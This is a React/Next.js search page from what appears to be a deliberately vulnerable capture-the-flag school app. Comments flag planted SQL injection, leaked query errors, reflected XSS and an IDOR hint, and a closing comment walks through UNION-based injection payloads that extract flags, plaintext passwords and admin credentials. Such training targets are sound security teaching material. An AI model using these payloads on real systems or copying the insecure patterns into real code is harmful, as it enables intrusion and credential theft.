"use client";

import { useState, useRef, useEffect } from "react";
import Navbar from "@/components/Navbar";
import Link from "next/link";
import { useRouter, useSearchParams } from "next/navigation";

// VULNERABILITY: q param → /api/search → interpolated into SQL
// UNION attack: %' UNION SELECT flag_value,flag_name,difficulty,points,hint FROM flags--

interface Student {
  id: number;
  full_name: string;
  class: string;
  section: string;
  admission_no: string;
}

const CLASS_FILTERS = ["All", "IX", "X", "XI", "XII"];

export default function SearchPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [query, setQuery] = useState(searchParams.get("q") ?? "");
  const [classFilter, setClass] = useState(searchParams.get("class") ?? "All");
  const [results, setResults] = useState<Student[] | null>(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [searched, setSearched] = useState(searchParams.get("q") ?? "");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Auto-search if q or class is present in URL
    const q = searchParams.get("q");
    const cls = searchParams.get("class");
    if (q !== null || cls !== null) {
      handleSearch(q ?? "", cls ?? "All");
    }
  }, [searchParams]);

  const handleSearch = async (overrideQ?: string, overrideClass?: string) => {
    const q = overrideQ ?? query;
    const c = overrideClass ?? classFilter;
    if (!q.trim() && c === "All") return;

    setLoading(true);
    setError("");
    setResults(null);
    setSearched(q);

    try {
      const url = `/api/search?q=${encodeURIComponent(q)}&class=${encodeURIComponent(c === "All" ? "" : c)}`;
      const res = await fetch(url);
      const data = await res.json();

      if (!res.ok) {
        // VULNERABILITY: Raw SQL error + executed query leaked for CTF
        setError((data.error || "Unknown error") + (data.query ? `\n\n[QUERY_LOG]: ${data.query}` : ""));
      } else {
        setResults(data.results || []);
      }
    } catch (err) {
      setError("Critical System Failure: Connection refused.");
    } finally {
      setLoading(false);
    }
  };

  const handleClear = () => {
    setQuery("");
    setClass("All");
    setResults(null);
    setError("");
    setSearched("");
    router.push("/search");
    inputRef.current?.focus();
  };

  return (
    <div style={{ background:"var(--cc-bg)", minHeight:"100vh" }}>
      <Navbar />
      <div style={{ marginLeft:240, paddingTop:56 }}>
        <main style={{ padding:"28px 28px", maxWidth:960 }}>

          {/* Header */}
          <div style={{ marginBottom:20 }}>
            <h1 style={{ fontSize:20, fontWeight:900, color:"var(--cc-navy)", margin:"0 0 3px" }}>Student Directory</h1>
            <p style={{ fontSize:12, color:"var(--cc-text-muted)", margin:0 }}>Registry of enrolled students</p>
          </div>

          {/* Search Card */}
          <div style={{ background:"#fff", borderRadius:12, padding:22, marginBottom:18, border:"1px solid var(--cc-border)", boxShadow:"0 2px 8px rgba(0,0,0,0.04)" }}>
            <div style={{ display:"flex", gap:12, marginBottom:14 }}>
              <div style={{ flex:1, position:"relative" }}>
                <span style={{ position:"absolute", left:13, top:"50%", transform:"translateY(-50%)", fontSize:16, color:"var(--cc-text-muted)", pointerEvents:"none" }}>🔍</span>
                <input
                  ref={inputRef}
                  type="text"
                  value={query}
                  onChange={e => setQuery(e.target.value)}
                  onKeyDown={e => e.key === "Enter" && handleSearch()}
                  placeholder="Search by student name or ID..."
                  style={{ width:"100%", border:"1.5px solid var(--cc-border)", borderRadius:8, padding:"10px 38px 10px 40px", fontSize:13, fontFamily:"'DM Mono',monospace", color:"var(--cc-text)", outline:"none", boxSizing:"border-box", transition:"border-color 0.2s", background:"#fafafa" }}
                  onFocus={e=>(e.target.style.borderColor="var(--cc-orange)")}
                  onBlur={e=>(e.target.style.borderColor="var(--cc-border)")}
                />
                {query && (
                  <button onClick={handleClear} style={{ position:"absolute", right:12, top:"50%", transform:"translateY(-50%)", background:"none", border:"none", fontSize:18, color:"var(--cc-text-muted)", cursor:"pointer" }}>×</button>
                )}
              </div>
              <button
                onClick={() => handleSearch()}
                disabled={loading}
                style={{ padding:"10px 28px", background: loading?"#d1d5db":"var(--cc-orange)", color:"#fff", border:"none", borderRadius:8, fontWeight:800, fontSize:13, cursor: loading?"not-allowed":"pointer", letterSpacing:0.5, transition:"background 0.2s", whiteSpace:"nowrap" }}
              >
                {loading ? "Searching…" : "Search"}
              </button>
            </div>

            {/* Class Filters */}
            <div style={{ display:"flex", alignItems:"center", gap:8 }}>
              <span style={{ fontSize:10, fontWeight:700, color:"var(--cc-text-muted)", textTransform:"uppercase", letterSpacing:1.5 }}>Filter by Class:</span>
              <div style={{ display:"flex", gap:6 }}>
                {CLASS_FILTERS.map(c => (
                  <button key={c} onClick={() => {
                      setClass(c);
                      const url = new URL(window.location.href);
                      url.searchParams.set("class", c === "All" ? "" : c);
                      if (query) url.searchParams.set("q", query);
                      router.push(url.pathname + url.search);
                    }}
                    style={{ padding:"4px 12px", borderRadius:20, fontSize:11, fontWeight:700, border:"1.5px solid", cursor:"pointer", transition:"all 0.15s",
                      background: classFilter===c ? "var(--cc-orange)" : "transparent",
                      borderColor: classFilter===c ? "var(--cc-orange)" : "var(--cc-border)",
                      color: classFilter===c ? "#fff" : "var(--cc-text-muted)",
                    }}>
                    {c}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* VULNERABILITY: Error display leaks raw SQL query via [QUERY_LOG] */}
          {error && (
            <div style={{ background:"rgba(220,38,38,0.05)", border:"1.5px solid rgba(220,38,38,0.2)", borderRadius:10, padding:"14px 18px", marginBottom:18 }}>
              <div style={{ display:"flex", gap:10, alignItems:"flex-start" }}>
                <span style={{ color:"#dc2626", fontSize:16, flexShrink:0 }}>⚠</span>
                <div>
                  <div style={{ fontSize:11, fontWeight:800, color:"#dc2626", textTransform:"uppercase", letterSpacing:1, marginBottom:6 }}>Database Exception Report</div>
                  <pre className="font-mono whitespace-pre-wrap break-all" style={{ fontSize:11, color:"#dc2626", lineHeight:1.6, margin:0 }}>{error}</pre>
                </div>
              </div>
            </div>
          )}

          {/* Results */}
          <div>
            {loading ? (
              <div style={{ display:"flex", flexDirection:"column", gap:8, opacity:0.5 }}>
                {[1,2,3].map(i=><div key={i} style={{ height:56, background:"#fff", borderRadius:8, border:"1px solid var(--cc-border)", animation:"pulse 1.5s ease-in-out infinite" }}/>)}
              </div>
            ) : results !== null && results.length > 0 ? (
              <>
                {/* VULNERABILITY: Raw URL param rendered as HTML — reflected XSS */}
                <div style={{ marginBottom:10, fontSize:11, color:"var(--cc-text-muted)", fontWeight:600 }}
                     dangerouslySetInnerHTML={{ __html: `Found <span style="color:var(--cc-orange);font-weight:800">${results.length}</span> records for &ldquo;${searched}&rdquo;` }} />
                <div style={{ background:"#fff", borderRadius:12, border:"1px solid var(--cc-border)", boxShadow:"0 2px 8px rgba(0,0,0,0.04)", overflow:"hidden" }}>
                  <table style={{ width:"100%", borderCollapse:"collapse" }}>
                    <thead>
                      <tr style={{ background:"var(--cc-navy)" }}>
                        {["ID","Student Name","Class / Sec","Admission No",""].map(h=>(
                          <th key={h} style={{ padding:"10px 16px", fontSize:10, fontWeight:800, color:"rgba(255,255,255,0.85)", textTransform:"uppercase", letterSpacing:1, textAlign:"left" }}>{h}</th>
                        ))}
                      </tr>
                    <tbody>
                      {/* VULNERABILITY: Render every key dynamically so UNION injected columns show up */}
                      {results.map((s: any, i: number) => (
                        <tr key={s.id || i} style={{ background:i%2===0?"#fff":"#f8f9fa", borderBottom:"1px solid var(--cc-border)" }}
                          onMouseEnter={e=>(e.currentTarget as HTMLElement).style.background="#f0f4ff"}
                          onMouseLeave={e=>(e.currentTarget as HTMLElement).style.background=i%2===0?"#fff":"#f8f9fa"}>
                          {Object.values(s).map((val: any, j: number) => (
                            <td key={j} style={{ padding:"11px 16px", fontSize:12, fontFamily:"'DM Mono',monospace", color:"var(--cc-text-muted)" }}>
                              {String(val ?? "")}
                            </td>
                          ))}
                          <td style={{ padding:"11px 16px", textAlign:"center" }}>
                            <Link href={`/profile/${s.id}`} style={{ fontSize:16, color:"var(--cc-orange)", textDecoration:"none", fontWeight:800 }}>→</Link>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </>
            ) : results !== null ? (
              <div style={{ textAlign:"center", padding:"60px 0", background:"#fff", borderRadius:12, border:"2px dashed var(--cc-border)" }}>
                <div style={{ fontSize:36, marginBottom:10, opacity:0.4 }}>📂</div>
                <p style={{ color:"var(--cc-text-muted)", fontSize:13, margin:0 }}>No students found matching your query.</p>
              </div>
            ) : (
              <div style={{ textAlign:"center", padding:"60px 0", border:"2px dashed var(--cc-border)", borderRadius:12 }}>
                <p style={{ fontSize:13, color:"var(--cc-text-muted)", fontFamily:"'DM Mono',monospace", fontStyle:"italic", margin:0 }}>Enter a name or ID to search the student registry…</p>
              </div>
            )}
          </div>

          {/* System Hint (IDOR nudge) */}
          <footer style={{ marginTop:24, textAlign:"center" }}>
            <p style={{ fontSize:10, fontFamily:"'DM Mono',monospace", color:"var(--cc-text-muted)", opacity:0.6, display:"flex", alignItems:"center", justifyContent:"center", gap:6, margin:0 }}>
              <span style={{ color:"#93c5fd" }}>SYSTEM_ID_INDEX:</span>
              Access restricted to pattern <span style={{ color:"#93c5fd", textDecoration:"underline", textDecorationColor:"rgba(147,197,253,0.3)" }}>/profile/[id]</span>
            </p>
          </footer>
        </main>
      </div>
    </div>
  );
}

function InitialAvatar({ name }: { name: string }) {
  const initials = name.split(" ").map(w => w[0]).slice(0, 2).join("").toUpperCase();
  const hue = name.split("").reduce((a, c) => a + c.charCodeAt(0), 0) % 360;

  return (
    <div style={{
      width:32, height:32, borderRadius:8, display:"flex", alignItems:"center", justifyContent:"center",
      fontSize:11, fontWeight:800, fontFamily:"'DM Mono',monospace", border:"1.5px solid",
      background: `hsl(${hue},50%,92%)`,
      borderColor: `hsl(${hue},40%,75%)`,
      color: `hsl(${hue},50%,35%)`,
      flexShrink:0,
    }}>
      {initials}
    </div>
  );
}

// VULNERABILITY :

// 1. Confirm SQL Injection

// Type:
// '

//  This breaks the query and the frontend will show:
// SQL error
//  Confirms injection works

// 2. Find Number of Columns

// Type:
// %' ORDER BY 5--

// Then try:

// %' ORDER BY 6--

//  When it errors at 6 → you know there are 5 columns

//  3. Extract Data via UNION

// Now you match 5 columns and inject your own SELECT.

//  Get flags:
// ' UNION SELECT flag_value, flag_name, difficulty, points, hint FROM flags--

//  The table in the UI will display the flags.

//  Dump users (including admin):
// %' UNION SELECT username, password, role, email, admission_no FROM users--

//  You'll see:

// usernames
// plaintext passwords
// roles (admin/student)
//  Get only admin credentials:
// %' UNION SELECT username, password, role, email, NULL FROM users WHERE role='admin'--

//  4. Confirm Database Type (Optional)
// %' UNION SELECT sqlite_version(), NULL, NULL, NULL, NULL--

//  5. List Tables
// %' UNION SELECT name, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
//⚡ Why this works (quick recap)
// ' → breaks out of LIKE '%...%'

// UNION SELECT → adds your own query
// -- → comments out rest of original query
// Matching column count → required for UNION